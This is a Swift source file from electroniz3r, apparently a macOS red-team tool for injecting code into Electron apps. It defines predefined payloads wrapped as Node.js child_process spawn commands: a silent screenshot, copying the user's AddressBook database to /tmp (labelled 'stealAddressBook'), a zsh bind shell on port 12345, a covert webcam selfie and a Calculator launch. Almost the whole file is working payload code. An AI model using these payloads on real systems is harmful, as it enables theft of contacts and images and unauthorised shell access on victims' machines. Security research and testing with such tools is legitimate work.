//
//  predefinedscripts.swift
//  electroniz3r
//
//  Created by Wojciech Reguła on 19/01/2023.
//

import Foundation
import ArgumentParser

func spawnCommandWrapper(cmd: String, args: [String]?) -> String {
    
    if let args = args {
        return "const { spawn } = require('child_process'); spawn('\(cmd)', \(args))"
    }
    
    return "const { spawn } = require('child_process'); spawn('\(cmd)')"
}

func getCommandForPredefinedScript(script: PredefinedScripts) -> String {
    
    switch script {
    case .calc:
        return spawnCommandWrapper(cmd: "/System/Applications/Calculator.app/Contents/MacOS/Calculator", args: nil)
    case .screenshot:
        print("Check /tmp/screenshot.jpg".green)
        return spawnCommandWrapper(cmd: "/usr/sbin/screencapture", args: ["-x", "-t", "jpg", "/tmp/screenshot.jpg"])
    case .stealAddressBook:
        print("Check /tmp/AddressBook.abcddb".green)
        let addressBookPath = NSString("~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb").expandingTildeInPath
        return spawnCommandWrapper(cmd: "/bin/cp", args: [addressBookPath, "/tmp/AddressBook.abcddb"])
    case .bindShell:
        print("Shell binding requested. Check `nc 127.0.0.1 12345`".green)
        return spawnCommandWrapper(cmd: "/bin/zsh", args: ["-c", "zmodload zsh/net/tcp && ztcp -l 12345 && ztcp -a $REPLY && /bin/zsh >&$REPLY 2>&$REPLY 0>&$REPLY"])
    case .takeSelfie:
        print("Check /tmp/selfie.jpg".green)
        prepareSwiftSelfieTaker()
        return spawnCommandWrapper(cmd: "/private/tmp/SwiftSelfieTaker", args: nil)
    }
    
}


enum PredefinedScripts: String, ExpressibleByArgument {
    case calc
    case screenshot
    case stealAddressBook
    case bindShell
    case takeSelfie
}
